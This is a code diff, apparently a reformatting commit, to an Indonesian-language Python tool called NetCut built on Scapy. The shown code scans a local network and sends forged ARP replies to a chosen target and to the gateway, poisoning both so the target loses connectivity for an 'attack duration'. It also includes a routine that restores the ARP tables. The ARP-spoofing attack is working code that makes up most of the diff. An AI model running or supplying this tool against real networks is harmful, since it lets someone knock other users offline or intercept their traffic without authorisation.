@@ -27,8 +27,15 @@ from threading import Event
 
 try:
     from scapy.all import (
-        ARP, Ether, get_if_addr, get_if_hwaddr, getmacbyip,
-        conf, sendp, srp, sniff
+        ARP,
+        Ether,
+        get_if_addr,
+        get_if_hwaddr,
+        getmacbyip,
+        conf,
+        sendp,
+        srp,
+        sniff,
     )
 except ImportError:
     sys.exit("[!] Scapy tidak terinstall. Install dengan: pip install scapy")
@@ -49,8 +56,9 @@ def signal_handler(sig, frame):
 def get_default_gateway():
     if os.name == "posix":
         try:
-            result = subprocess.run(["ip", "route", "show", "default"],
-                                    capture_output=True, text=True)
+            result = subprocess.run(
+                ["ip", "route", "show", "default"], capture_output=True, text=True
+            )
             if result.stdout:
                 m = re.search(r"via\s+([\d.]+)", result.stdout)
                 if m:
@@ -69,9 +77,13 @@ def get_default_gateway():
     elif os.name == "nt":
         try:
             result = subprocess.run(
-                ["powershell", "-Command",
-                 "(Get-NetRoute -DestinationPrefix '0.0.0.0/0' | Select-Object -First 1).NextHop"],
-                capture_output=True, text=True
+                [
+                    "powershell",
+                    "-Command",
+                    "(Get-NetRoute -DestinationPrefix '0.0.0.0/0' | Select-Object -First 1).NextHop",
+                ],
+                capture_output=True,
+                text=True,
             )
             gw = result.stdout.strip()
             if gw:
@@ -107,7 +119,9 @@ class NetCut:
 
         ans, _ = srp(
             Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=network),
-            timeout=3, iface=self.iface, verbose=False
+            timeout=3,
+            iface=self.iface,
+            verbose=False,
         )
 
         devices = {}
@@ -130,8 +144,12 @@ class NetCut:
         if mac:
             return mac
         try:
-            ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip),
-                         timeout=2, iface=self.iface, verbose=False)
+            ans, _ = srp(
+                Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip),
+                timeout=2,
+                iface=self.iface,
+                verbose=False,
+            )
             for _, rcv in ans:
                 if rcv.psrc == ip:
                     return rcv.hwsrc
@@ -174,13 +192,19 @@ class NetCut:
                     break
 
                 target_pkt = Ether(src=self.attacker_mac, dst=self.real_target_mac) / ARP(
-                    op=2, psrc=self.gateway_ip, pdst=self.target_ip,
-                    hwsrc=self.attacker_mac, hwdst=self.real_target_mac
+                    op=2,
+                    psrc=self.gateway_ip,
+                    pdst=self.target_ip,
+                    hwsrc=self.attacker_mac,
+                    hwdst=self.real_target_mac,
                 )
 
                 gateway_pkt = Ether(src=self.attacker_mac, dst=self.real_gateway_mac) / ARP(
-                    op=2, psrc=self.target_ip, pdst=self.gateway_ip,
-                    hwsrc=self.attacker_mac, hwdst=self.real_gateway_mac
+                    op=2,
+                    psrc=self.target_ip,
+                    pdst=self.gateway_ip,
+                    hwsrc=self.attacker_mac,
+                    hwdst=self.real_gateway_mac,
                 )
 
                 sendp(target_pkt, iface=self.iface, verbose=False)
@@ -206,12 +230,18 @@ class NetCut:
 
         for _ in range(5):
             restore_target = Ether(src=self.real_gateway_mac, dst=self.real_target_mac) / ARP(
-                op=2, psrc=self.gateway_ip, pdst=self.target_ip,
-                hwsrc=self.real_gateway_mac, hwdst="ff:ff:ff:ff:ff:ff"
+                op=2,
+                psrc=self.gateway_ip,
+                pdst=self.target_ip,
+                hwsrc=self.real_gateway_mac,
+                hwdst="ff:ff:ff:ff:ff:ff",
             )
             restore_gateway = Ether(src=self.real_target_mac, dst=self.real_gateway_mac) / ARP(
-                op=2, psrc=self.target_ip, pdst=self.gateway_ip,
-                hwsrc=self.real_target_mac, hwdst="ff:ff:ff:ff:ff:ff"
+                op=2,
+                psrc=self.target_ip,
+                pdst=self.gateway_ip,
+                hwsrc=self.real_target_mac,
+                hwdst="ff:ff:ff:ff:ff:ff",
             )
             sendp(restore_target, iface=self.iface, verbose=False)
             sendp(restore_gateway, iface=self.iface, verbose=False)
@@ -235,8 +265,12 @@ Contoh:
     parser.add_argument("--target", help="IP target yang akan diputuskan")
     parser.add_argument("--gateway", help="IP gateway (auto-detect jika tidak diatur)")
     parser.add_argument("--iface", help="Interface jaringan (contoh: eth0, wlan0, enp0s3)")
-    parser.add_argument("--time", type=int, default=0, help="Durasi serangan dalam detik (0 = tak terbatas)")
-    parser.add_argument("--scan", action="store_true", help="Scan jaringan untuk menemukan perangkat")
+    parser.add_argument(
+        "--time", type=int, default=0, help="Durasi serangan dalam detik (0 = tak terbatas)"
+    )
+    parser.add_argument(
+        "--scan", action="store_true", help="Scan jaringan untuk menemukan perangkat"
+    )
     parser.add_argument("--restore", action="store_true", help="Pulihkan tabel ARP target")
     args = parser.parse_args()
 
